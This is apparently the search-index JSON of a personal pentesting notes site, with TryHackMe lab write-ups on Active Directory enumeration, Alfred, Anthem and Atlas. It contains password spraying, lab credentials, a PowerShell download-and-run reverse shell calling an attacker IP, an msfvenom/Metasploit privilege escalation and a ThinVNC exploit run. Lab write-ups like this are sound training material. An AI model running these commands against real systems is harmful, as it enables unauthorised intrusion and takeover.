{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"rdrg0x","text":"<p>Welcome to my personal pentesting knowledge base.</p> <ul> <li>Writeups</li> <li>Notes</li> <li>Labs</li> </ul>"},{"location":"tags/","title":"Tags","text":""},{"location":"tags/#tag:active-directory","title":"active-directory","text":"<ul> <li>            AD Basic Enumeration          </li> <li>            Attacking kerberos          </li> </ul>"},{"location":"tags/#tag:jenkins","title":"jenkins","text":"<ul> <li>            Alfred          </li> </ul>"},{"location":"tags/#tag:tryhackme","title":"tryhackme","text":"<ul> <li>            AD Basic Enumeration          </li> <li>            Alfred          </li> <li>            Anthem          </li> <li>            Atlas          </li> <li>            Attacking kerberos          </li> </ul>"},{"location":"tags/#tag:windows","title":"windows","text":"<ul> <li>            AD Basic Enumeration          </li> <li>            Alfred          </li> <li>            Anthem          </li> <li>            Atlas          </li> <li>            Attacking kerberos          </li> </ul>"},{"location":"TryHackMe/ADBasicEnum/","title":"AD Basic Enumeration","text":"","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/ADBasicEnum/#enumeration","title":"Enumeration","text":"","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/ADBasicEnum/#nmap","title":"Nmap","text":"<pre><code>nmap -p- --open -sS --min-rate 5000 -n -Pn 10.211.11.10 -oG allPorts2\n\nPORT      STATE SERVICE\n22/tcp    open  ssh\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n3389/tcp  open  ms-wbt-server\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49672/tcp open  unknown\n49676/tcp open  unknown\n49677/tcp open  unknown\n49678/tcp open  unknown\n49681/tcp open  unknown\n49696/tcp open  unknown\n49708/tcp open  unknown\n</code></pre> <pre><code>nmap -sC -sV -O 22,135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49677,50095 10.211.11.10 -oN target2.txt\n\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)\n| ssh-hostkey: \n|   2048 57:d9:ac:9e:bc:f9:27:c9:8a:7f:01:28:72:9f:05:7a (RSA)\n|   256 bc:21:8a:c6:9f:71:dc:8f:b7:e9:6b:71:71:cd:eb:ef (ECDSA)\n|_  256 76:ba:01:61:c4:69:5b:c4:d6:8a:dd:8d:c7:32:7b:f3 (ED25519)\n\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-11 07:43:04Z)\n\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)\n\n445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)\n\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-09-11T07:43:44+00:00; -1s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: TRYHACKME\n|   NetBIOS_Domain_Name: TRYHACKME\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: tryhackme.loc\n|   DNS_Computer_Name: DC.tryhackme.loc\n|   DNS_Tree_Name: tryhackme.loc\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-09-11T07:43:30+00:00\n| ssl-cert: Subject: commonName=DC.tryhackme.loc\n| Not valid before: 2025-09-09T03:13:04\n|_Not valid after:  2026-03-11T03:13:04\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.95%E=4%D=9/11%OT=22%CT=1%CU=33826%PV=Y%DS=2%DC=I%G=Y%TM=68C27DB\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%TS=\nOS:U)SEQ(SP=102%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=104%GCD=1%ISR\nOS:=10A%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=105%GCD=1%ISR=108%TI=I%CI=I%II=I%SS\nOS:=S%TS=U)SEQ(SP=FD%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M509NW8N\nOS:NS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O5=M509NW8NNS%O6=M509NNS)WIN(W\nOS:1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%\nOS:O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%\nOS:T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD\nOS:=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S\nOS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R\nOS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%\nOS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 0s, deviation: 1s, median: -1s\n| smb-os-discovery: \n|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)\n|   Computer name: DC\n|   NetBIOS computer name: DC\\x00\n|   Domain name: tryhackme.loc\n|   Forest name: tryhackme.loc\n|   FQDN: DC.tryhackme.loc\n|_  System time: 2025-09-11T07:43:32+00:00\n| smb2-time: \n|   date: 2025-09-11T07:43:30\n|_  start_date: N/A\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 114.38 seconds\n</code></pre>","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/ADBasicEnum/#smb","title":"SMB","text":"<pre><code>nxc smb 10.211.11.10 -u '' -p '' --shares                                                                                       \nSMB         10.211.11.10    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:tryhackme.loc) (signing:True) (SMBv1:True) \nSMB         10.211.11.10    445    DC               [+] tryhackme.loc\\: \nSMB         10.211.11.10    445    DC               [*] Enumerated shares\nSMB         10.211.11.10    445    DC               Share           Permissions     Remark\nSMB         10.211.11.10    445    DC               -----           -----------     ------\nSMB         10.211.11.10    445    DC               ADMIN$                          Remote Admin\nSMB         10.211.11.10    445    DC               AnonShare       READ,WRITE      \nSMB         10.211.11.10    445    DC               C$                              Default share\nSMB         10.211.11.10    445    DC               IPC$                            Remote IPC\nSMB         10.211.11.10    445    DC               NETLOGON                        Logon server share \nSMB         10.211.11.10    445    DC               SharedFiles     READ,WRITE      \nSMB         10.211.11.10    445    DC               SYSVOL                          Logon server share \nSMB         10.211.11.10    445    DC               UserBackups     READ,WRITE      \n</code></pre> <pre><code>smbclient //10.211.11.10/SharedFiles -N   \nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                   D        0  Thu Sep 11 04:45:34 2025\n  ..                                  D        0  Thu Sep 11 04:45:34 2025\n  Mouse_and_Malware.txt               A     1141  Thu May 15 05:40:19 2025\n\n        7863807 blocks of size 4096. 3470130 blocks available\nsmb: \\&gt; \n\n# nos conectamos en la sigueinte ruta\nsmbclient //10.211.11.10/UserBackups -N   \nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                   D        0  Thu Sep 11 04:45:41 2025\n  ..                                  D        0  Thu Sep 11 04:45:41 2025\n  flag.txt                            A       14  Thu May 15 05:34:33 2025\n  story.txt                           A      953  Thu May 15 05:37:57 2025\n\n        7863807 blocks of size 4096. 3470129 blocks available\nsmb: \\&gt; get flag.txt\ngetting file \\flag.txt of size 14 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)\nsmb: \\&gt; get story.txt \ngetting file \\story.txt of size 953 as story.txt (1.0 KiloBytes/sec) (average 0.5 KiloBytes/sec)\nsmb: \\&gt; \n</code></pre> <p>Flag <pre><code>cat flag.txt             \nTHM{88_SMB_88}   \n</code></pre></p>","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/ADBasicEnum/#rpcclient","title":"rpcclient","text":"<pre><code>rpcclient -U \"\" 10.211.11.10 -N -c 'enumdomusers'\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[sshd] rid:[0x649]\nuser:[gerald.burgess] rid:[0x650]\nuser:[nigel.parsons] rid:[0x651]\nuser:[guy.smith] rid:[0x652]\nuser:[jeremy.booth] rid:[0x653]\nuser:[barbara.jones] rid:[0x654]\nuser:[marion.kay] rid:[0x655]\nuser:[kathryn.williams] rid:[0x656]\nuser:[danny.baker] rid:[0x657]\nuser:[gary.clarke] rid:[0x658]\nuser:[daniel.turner] rid:[0x659]\nuser:[debra.yates] rid:[0x65a]\nuser:[jeffrey.thompson] rid:[0x65b]\nuser:[martin.riley] rid:[0x65c]\nuser:[danielle.lee] rid:[0x65d]\nuser:[douglas.roberts] rid:[0x65e]\nuser:[dawn.bolton] rid:[0x65f]\nuser:[danielle.ali] rid:[0x660]\nuser:[michelle.palmer] rid:[0x661]\nuser:[katie.thomas] rid:[0x662]\nuser:[jennifer.harding] rid:[0x663]\nuser:[strategos] rid:[0x664]\nuser:[empanadal0v3r] rid:[0x665]\nuser:[drgonz0] rid:[0x666]\nuser:[strate905] rid:[0x667]\nuser:[krbtgtsvc] rid:[0x668]\nuser:[asrepuser1] rid:[0x669]\nuser:[rduke] rid:[0xa31]\nuser:[user] rid:[0x1201]\n</code></pre> <pre><code>rpcclient -U \"\" 10.211.11.10 -N -c 'enumdomusers' | grep -oP '\\[.*?\\]' | grep -v '0x' | tr -d '[]' &gt; users.txt\nAdministrator\nGuest\nkrbtgt\nsshd\ngerald.burgess\nnigel.parsons\nguy.smith\njeremy.booth\nbarbara.jones\nmarion.kay\nkathryn.williams\ndanny.baker\ngary.clarke\ndaniel.turner\ndebra.yates\njeffrey.thompson\nmartin.riley\ndanielle.lee\ndouglas.roberts\ndawn.bolton\ndanielle.ali\nmichelle.palmer\nkatie.thomas\njennifer.harding\nstrategos\nempanadal0v3r\ndrgonz0\nstrate905\nkrbtgtsvc\nasrepuser1\nrduke\nuser\n</code></pre>","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/ADBasicEnum/#_1","title":"AD Basic Enumeration","text":"<pre><code>enum4linux 10.211.11.10 &gt; DomianEnum.txt\n</code></pre> <p>Convertiur decimal a HEX</p> <pre><code>user:[katie.thomas] rid:[0x662]\n</code></pre> <pre><code>printf \"%x\\n\" 1634                                                                       \n662\n</code></pre> <p></p> <p>Es posible mirar las politicas de las contrase\u00f1as</p> <pre><code>nxc smb 10.211.11.10 --pass-pol\n</code></pre> <p></p> <p>Lista de passwords:</p> <pre><code>Password!\nPassword1\nPassword1!\nP@ssword\nPa55word1\n</code></pre> <p>Con los usuarios encontrados en el dominio, probamos con ls lista de contrase\u00f1as entregada.</p> <pre><code>nxc smb 10.211.11.10 -u users.txt -p passwords.txt --continue-on-success\nSMB                      10.211.11.10    445    DC               [+] tryhackme.loc\\rduke:Password1! \n</code></pre> <p></p>","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/alfred/","title":"Alfred","text":"","tags":["tryhackme","windows","jenkins"]},{"location":"TryHackMe/alfred/#enumeration","title":"Enumeration","text":"","tags":["tryhackme","windows","jenkins"]},{"location":"TryHackMe/alfred/#nmap","title":"Nmap","text":"<pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.187.139 -oG allPorts\n\nPORT     STATE SERVICE       REASON\n80/tcp   open  http          syn-ack ttl 127\n3389/tcp open  ms-wbt-server syn-ack ttl 127\n8080/tcp open  http-proxy    syn-ack ttl 127\n</code></pre> <pre><code>PORT     STATE SERVICE    VERSION\n80/tcp   open  http       Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: Site doesn't have a title (text/html).\n\n3389/tcp open  tcpwrapped\n| ssl-cert: Subject: commonName=alfred\n| Not valid before: 2025-06-29T10:49:57\n|_Not valid after:  2025-12-29T10:49:57\n\n8080/tcp open  http       Jetty 9.4.z-SNAPSHOT\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\n| http-robots.txt: 1 disallowed entry \n|_/\nService Info: OS: Windows; CPE: cpe:/o:microsoft:**windows**\n</code></pre>","tags":["tryhackme","windows","jenkins"]},{"location":"TryHackMe/alfred/#http-80","title":"HTTP (80)","text":"","tags":["tryhackme","windows","jenkins"]},{"location":"TryHackMe/alfred/#http-8080","title":"HTTP (8080)","text":"<p>Credenciales por defecto <code>admin:admin</code></p> <p></p> <p></p>","tags":["tryhackme","windows","jenkins"]},{"location":"TryHackMe/alfred/#exploit","title":"Exploit","text":"<p>Agregar la siguiente linea de c\u00f3digo</p> <pre><code>powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.244.36:8282/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.244.36 -Port 1234\n</code></pre> <pre><code>python3 -m http.server 8282 \n\nnc -nvlp 1234  \n</code></pre> <p></p> <p></p> <p></p> <pre><code>PS C:\\Users\\bruce\\Desktop&gt; type user.txt\n79007a09481963edf2e1321abd9ae2a0\n</code></pre>","tags":["tryhackme","windows","jenkins"]},{"location":"TryHackMe/alfred/#privilege-escalation","title":"Privilege Escalation","text":"revshell.exe<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.244.36 LPORT=5555 -f exe -o revshell.exe   \n</code></pre> <pre><code>powershell \"(New-Object System.Net.WebClient).Downloadfile('http://10.9.244.36:8001/revshell.exe','revshell.exe')\"\n</code></pre> <pre><code>msfdb run                                                                                                   \n[+] Starting database\n</code></pre> <pre><code>msf6 &gt; use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set LHOST 10.9.244.36\nLHOST =&gt; 10.9.244.36\nmsf6 exploit(multi/handler) &gt; set LPORT 5555\nLPORT =&gt; 5555\nmsf6 exploit(multi/handler) &gt; run\n[*] Started reverse TCP handler on 10.9.244.36:5555 \n</code></pre> <pre><code>PS C:\\Users\\bruce\\Desktop&gt; cd 'C:\\Program Files (x86)\\Jenkins\\workspace\\admin'\nPS C:\\Program Files (x86)\\Jenkins\\workspace\\admin&gt; \n</code></pre> <pre><code>Start-Process revshell.exe\n</code></pre> <pre><code>meterpreter &gt; impersonate_token \"BUILTIN\\Administrators\"\n[-] Warning: Not currently running as SYSTEM, not all tokens will be available\n             Call rev2self if primary process token is SYSTEM\n[+] Delegation token available\n[+] Successfully impersonated user NT AUTHORITY\\SYSTEM\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; getsystem\n[-] priv_elevate_getsystem: Operation failed: The environment is incorrect\n</code></pre> <p>Flag: root.txt</p> <pre><code>type C:\\Windows\\System32\\config\\root.txt\n</code></pre>","tags":["tryhackme","windows","jenkins"]},{"location":"TryHackMe/anthem/","title":"anthem","text":"","tags":["tryhackme","windows"]},{"location":"TryHackMe/anthem/#enumeration","title":"Enumeration","text":"","tags":["tryhackme","windows"]},{"location":"TryHackMe/anthem/#nmap","title":"Nmap","text":"<pre><code>nmap -p- --open -sS --min-rate 5000 -n -Pn 10.201.44.13 -oN allPorts.txt\n\nPORT     STATE SERVICE\n80/tcp   open  http\n3389/tcp open  ms-wbt-server\n</code></pre> <pre><code>nmap -sC -sV -p80,3389 -Pn 10.201.44.13 -oN target.txt                                                       \n\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-10-17T06:12:48+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=WIN-LU09299160F\n| Not valid before: 2025-10-16T06:07:47\n|_Not valid after:  2026-04-17T06:07:47\n| rdp-ntlm-info: \n|   Target_Name: WIN-LU09299160F\n|   NetBIOS_Domain_Name: WIN-LU09299160F\n|   NetBIOS_Computer_Name: WIN-LU09299160F\n|   DNS_Domain_Name: WIN-LU09299160F\n|   DNS_Computer_Name: WIN-LU09299160F\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-10-17T06:11:31+00:00\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 96.63 seconds\n</code></pre>","tags":["tryhackme","windows"]},{"location":"TryHackMe/anthem/#http-80","title":"HTTP (80)","text":"<pre><code>whatweb http://10.201.44.13   \nhttp://10.201.44.13 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.201.44.13], JQuery[1.11.0], Open-Graph-Protocol, OpenSearch[http://10.201.44.13/opensearch/1073], Script[text/javascript], Title[Anthem.com - Welcome to our blog], X-UA-Compatible[IE=edge]\n</code></pre> <pre><code>gobuster dir -u http://10.201.44.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x txt,php,js\n\n===============================================================\nGobuster v3.8\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.201.44.13\n[+] Method:                  GET\n[+] Threads:                 100\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.8\n[+] Extensions:              js,txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.js (Status: 400) [Size: 3420]\n/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.txt (Status: 400) [Size: 3420]\n/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]\n/search               (Status: 200) [Size: 3418]\n/blog                 (Status: 200) [Size: 5394]\n/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php (Status: 400) [Size: 3420]\n/sitemap              (Status: 200) [Size: 1041]\n/rss                  (Status: 200) [Size: 1868]\n/archive              (Status: 301) [Size: 123] [--&gt; /blog/]\n/categories           (Status: 200) [Size: 3541]\n/authors              (Status: 200) [Size: 4115]\n/Search               (Status: 200) [Size: 3468]\n/tags                 (Status: 200) [Size: 3594]\n/install              (Status: 302) [Size: 126] [--&gt; /umbraco/]\n/RSS                  (Status: 200) [Size: 1868]\n/Blog                 (Status: 200) [Size: 5394]\n/SiteMap              (Status: 200) [Size: 1041]\n/Archive              (Status: 301) [Size: 123] [--&gt; /blog/]\n/robots.txt           (Status: 200) [Size: 192]\n/siteMap              (Status: 200) [Size: 1041]\n/INSTALL              (Status: 302) [Size: 126] [--&gt; /umbraco/]\n/Sitemap              (Status: 200) [Size: 1041]\n/1073                 (Status: 200) [Size: 5394]\n/Rss                  (Status: 200) [Size: 1868]\n/Categories           (Status: 200) [Size: 3541]\n</code></pre>","tags":["tryhackme","windows"]},{"location":"TryHackMe/anthem/#rdp","title":"RDP","text":"<pre><code>xfreerdp /u:sg /p:'UmbracoIsTheBest!' /v:10.201.44.13 /cert-ignore /dynamic-resolution +clipboard\n</code></pre> <pre><code>PS C:\\Users\\SG&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name          SID\n================== ==============================================\nwin-lu09299160f\\sg S-1-5-21-3886845925-2521176483-1368255183-1000\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                             Type             SID          Attributes\n====================================== ================ ============ ==================================================\nEveryone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group\nLOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Mandatory Level Label            S-1-16-8192\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n</code></pre> <pre><code>xfreerdp /u:Administrator /p:'ChangeMeBaby1MoreTime' /v:10.201.44.13 /cert-ignore /dynamic-resolution +clipboard\n</code></pre>","tags":["tryhackme","windows"]},{"location":"TryHackMe/atlas/","title":"atlas","text":"","tags":["tryhackme","windows"]},{"location":"TryHackMe/atlas/#enumeration","title":"Enumeration","text":"","tags":["tryhackme","windows"]},{"location":"TryHackMe/atlas/#nmap","title":"Nmap","text":"<pre><code>nmap -p- --open -sS --min-rate 5000 -n -Pn -oN allPorts.txt -oG ports 10.201.53.80\n\nPORT     STATE SERVICE\n3389/tcp open  ms-wbt-server\n7680/tcp open  pando-pub\n8080/tcp open  http-proxy\n</code></pre> <pre><code>nmap -sC -sV -p3389,7680,8080 -Pn 10.201.53.80 -oN target.txt\n\nPORT     STATE    SERVICE       VERSION\n3389/tcp open     ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-11-05T08:11:32+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=GAIA\n| Not valid before: 2025-11-04T08:03:55\n|_Not valid after:  2026-05-06T08:03:55\n7680/tcp filtered pando-pub\n8080/tcp open     http-proxy\n| http-auth: \n| HTTP/1.1 401 Access Denied\\x0D\n|_  Digest qop=auth nonce=oxcX68px5kCI4zgCynHmQA== realm=ThinVNC opaque=RdFwI8RWkZUZNoA7dQl8yj80O3fDRyVFVg\n|_http-title: 401 Access Denied\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 404 Not Found\n|     Content-Type: text/html\n|     Content-Length: 177\n|     Connection: Keep-Alive\n|     &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404 Not Found&lt;/H1&gt;The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\n|   GetRequest: \n|     HTTP/1.1 401 Access Denied\n|     Content-Type: text/html\n|     Content-Length: 144\n|     Connection: Keep-Alive\n|     WWW-Authenticate: Digest realm=\"ThinVNC\", qop=\"auth\", nonce=\"ZsSj4Mpx5kCI1zgCynHmQA==\", opaque=\"cp5TYmnrjexhTJeoocMfNeiKJx8RtVDQbr\"\n|_    &lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401 Access Denied&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401 Access Denied&lt;/H1&gt;The requested URL requires authorization.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.95%I=7%D=11/5%Time=690B063E%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,179,\"HTTP/1\\.1\\x20401\\x20Access\\x20Denied\\r\\nContent-Type:\\x20\nSF:text/html\\r\\nContent-Length:\\x20144\\r\\nConnection:\\x20Keep-Alive\\r\\nWWW\nSF:-Authenticate:\\x20Digest\\x20realm=\\\"ThinVNC\\\",\\x20qop=\\\"auth\\\",\\x20nonc\nSF:e=\\\"ZsSj4Mpx5kCI1zgCynHmQA==\\\",\\x20opaque=\\\"cp5TYmnrjexhTJeoocMfNeiKJx8\nSF:RtVDQbr\\\"\\r\\n\\r\\n&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401\\x20Access\\x20Denied&lt;/TITLE&gt;&lt;/HE\nSF:AD&gt;&lt;BODY&gt;&lt;H1&gt;401\\x20Access\\x20Denied&lt;/H1&gt;The\\x20requested\\x20URL\\x20\\x2\nSF:0requires\\x20authorization\\.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\\r\\n\")%r(FourOhFourRequest\nSF:,111,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Type:\\x20text/html\\r\\\nSF:nContent-Length:\\x20177\\r\\nConnection:\\x20Keep-Alive\\r\\n\\r\\n&lt;HTML&gt;&lt;HEAD\nSF:&gt;&lt;TITLE&gt;404\\x20Not\\x20Found&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;404\\x20Not\\x20Found\nSF:&lt;/H1&gt;The\\x20requested\\x20URL\\x20nice%20ports%2C/Tri%6Eity\\.txt%2ebak\\x2\nSF:0was\\x20not\\x20found\\x20on\\x20this\\x20server\\.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\\r\\n\");\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -1s\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 135.93 seconds\n</code></pre>","tags":["tryhackme","windows"]},{"location":"TryHackMe/atlas/#http-80-8080","title":"HTTP (80, 8080)","text":"<pre><code>whatweb http://10.201.53.80:8080\nhttp://10.201.53.80:8080 [401 Unauthorized] Country[RESERVED][ZZ], IP[10.201.53.80], Title[401 Access Denied], WWW-Authenticate[ThinVNC][Digest]\n</code></pre> <pre><code>curl 10.201.53.80:8080 -v                                                                                     \n\n*   Trying 10.201.53.80:8080...\n* Connected to 10.201.53.80 (10.201.53.80) port 8080\n* using HTTP/1.x\n&gt; GET / HTTP/1.1\n&gt; Host: 10.201.53.80:8080\n&gt; User-Agent: curl/8.15.0\n&gt; Accept: */*\n&gt; \n* Request completely sent off\n&lt; HTTP/1.1 401 Access Denied\n&lt; Content-Type: text/html\n&lt; Content-Length: 144\n&lt; Connection: Keep-Alive\n&lt; WWW-Authenticate: Digest realm=\"ThinVNC\", qop=\"auth\", nonce=\"euTo98px5kDI4zgCynHmQA==\", opaque=\"fGy8UHZ0o8gextFhHmJ35gJGF2fCCsZw8r\"\n&lt; \n&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;401 Access Denied&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;401 Access Denied&lt;/H1&gt;The requested URL  requires authorization.&lt;P&gt;&lt;/BODY&gt;&lt;/HTML&gt;\n* Connection #0 to host 10.201.53.80 left intact\n</code></pre> <pre><code>searchsploit thinvnc                   \n\n---------------------------------------------- --------------------------------- \nExploit Title                                 | Path \n---------------------------------------------- --------------------------------- \nThinVNC 1.0b1 - Authentication Bypass         | windows/remote/47519.py \n---------------------------------------------- --------------------------------- \nShellcodes: No Results\n</code></pre>","tags":["tryhackme","windows"]},{"location":"TryHackMe/atlas/#privesc","title":"Privesc","text":"<p>Descargamos el exploit \u00a0https://github.com/MuirlandOracle/CVE-2019-17662</p> CVE-2019-17662.py<pre><code>./CVE-2019-17662.py 10.201.53.80 8080     